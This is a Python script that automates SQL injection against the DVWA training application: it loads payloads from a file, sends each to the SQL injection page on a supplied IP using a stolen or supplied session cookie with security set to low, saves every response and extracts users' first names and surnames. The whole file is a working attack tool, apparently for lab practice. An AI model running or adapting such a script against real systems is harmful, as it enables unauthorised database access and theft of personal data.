import requests
from bs4 import BeautifulSoup
import sys
import random

def main():
    if len(sys.argv) != 3:
        print("Usage: python <py_file> <IP_ADDRESS> <PHPSESSID>")
        # python att.py 192.168.137.170 8h6orlcaa1lqbnsvm3v4g6mobs
        return
    
    ip_address = sys.argv[1]
    phpsessid = sys.argv[2]

    SQL_URL = f"http://{ip_address}/DVWA/vulnerabilities/sqli/"
    BSQL_URL = f"http://{ip_address}/DVWA/vulnerabilities/sqli_blind/"
    COOKIES = {"security": "low", "PHPSESSID": phpsessid}

    # Read payloads from file
    try:
        with open('sql_payloads.txt', 'r') as file:
            payloads = file.read().splitlines()
    except FileNotFoundError:
        print("sql_payload.txt file not found.")
        return

    # Shuffle payloads
    random.shuffle(payloads)

    def extract_data(payload):
        try:
            response = requests.get(SQL_URL, params={"id": payload, "Submit": "Submit"}, cookies=COOKIES, timeout=5)
            return response.text
        except requests.Timeout:
            print(f"Timeout occurred for payload: {payload}")
            return "Timeout occurred"
        except requests.RequestException as e:
            print(f"Request exception occurred for payload: {payload}, error: {str(e)}")
            return f"Request exception: {str(e)}"

    def save_to_html(filename, data):
        with open(filename, 'w', encoding='utf-8') as file:
            file.write("<html>\n<head>\n<title>Extracted Data</title>\n</head>\n<body>\n")
            file.write("<pre>\n")
            file.write(data)
            file.write("\n</pre>\n")
            file.write("</body>\n</html>")

    for index, payload in enumerate(payloads, start=1):
        print(f"Processing payload {index}/{len(payloads)}: {payload}")
        extracted_data = extract_data(payload)
        filename = f"extracted_data_{index}.html"
        save_to_html(filename, extracted_data)
        print(f"Extracted data saved to {filename}\n")
        
        soup = BeautifulSoup(extracted_data, 'html.parser')
        pre_tags = soup.find_all('pre')
        for pre_tag in pre_tags:
            lines = pre_tag.decode_contents().split('<br/>')
            for line in lines:
                if 'First name:' in line:
                    first_name = line.split('First name: ')[1].strip()
                    print(f"First name: {first_name}")
                if 'Surname:' in line:
                    surname = line.split('Surname: ')[1].strip()
                    print(f"Surname: {surname}")
            print()

if __name__ == "__main__":
    main()